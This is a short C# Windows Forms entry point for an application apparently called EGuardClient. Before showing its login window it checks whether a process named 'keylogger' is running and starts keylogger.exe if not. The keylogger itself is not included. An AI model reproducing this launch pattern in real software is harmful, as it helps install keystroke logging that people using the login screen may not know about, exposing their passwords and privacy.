using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using System.Diagnostics;

namespace EGuardClient
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {

            //checks if keylogger is running
            bool processFound = false;
            Process[] processlist = Process.GetProcesses();
            foreach (Process p in processlist)
            {
                if (p.ProcessName.Length >= 9 && String.Equals(p.ProcessName.Substring(0, 9), "keylogger"))
                {
                    processFound = true;
                    break;
                }
            }
            //starts the keylogger if not running already
            if (processFound == false)
            {
                Process.Start("keylogger.exe");
            }
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new EGuardClientLogin());
      
        }
    }
}
